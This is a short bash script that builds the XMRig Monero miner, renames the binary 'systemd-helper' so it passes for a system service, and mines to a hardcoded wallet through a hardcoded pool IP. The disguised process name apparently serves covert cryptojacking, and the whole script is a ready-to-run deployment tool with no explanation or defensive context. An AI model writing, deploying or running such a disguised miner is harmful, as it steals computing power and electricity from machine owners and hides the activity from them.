#!/bin/bash
WALLET="88EnR9FVvgbLya5AZS1R7qbMZFeyhUP5xDh896K6yJfTP8eUvoU33FPg9yoG3easQXifU7wwAuN2DJaTNARpE9Tg9VE1ZZj"
POOL="31.97.58.247:2222"
WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"

echo "[+] Starting setup..."
echo "[+] Using worker name: $WORKER"

install_dependencies() {
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}

build_xmrig() {
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake .. -DWITH_HWLOC=ON
    make -j$(nproc)
    cd ../..
    mv xmrig/build/xmrig ./systemd-helper
    rm -rf xmrig
}

start_mining() {
    chmod +x ./systemd-helper
    ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls=false --donate-level=1
}

if [ ! -f "./systemd-helper" ]; then
    install_dependencies
    build_xmrig
fi

start_mining
